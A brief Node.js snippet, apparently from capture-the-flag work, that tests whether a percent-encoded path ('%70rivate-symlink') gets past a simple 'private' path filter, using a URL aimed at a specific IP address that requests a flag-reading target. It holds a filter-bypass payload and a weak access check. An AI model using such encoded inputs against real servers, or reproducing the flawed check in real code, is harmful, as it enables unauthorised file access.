const path = require('path');
const crypto = require('crypto');
const isPrivate = p => {
    pbase = path.basename(p);
    return p.indexOf('private') > -1 || /%|private/.test(pbase);
}

let url = new URL("http://45.147.230.214:36693/cgi-bin/%PUBLIC_URL%/%70rivate-symlink/index?target=/readflagf&path=/app/cgi-bin/sayhi.js");
let pname = url.pathname;
console.log(pname);
if (pname.startsWith('/cgi-bin/')) {
    pname = pname.slice('/cgi-bin/'.length - 1);
    pname = decodeURIComponent(pname);
    console.log(pname);
    console.log(isPrivate(pname))

} 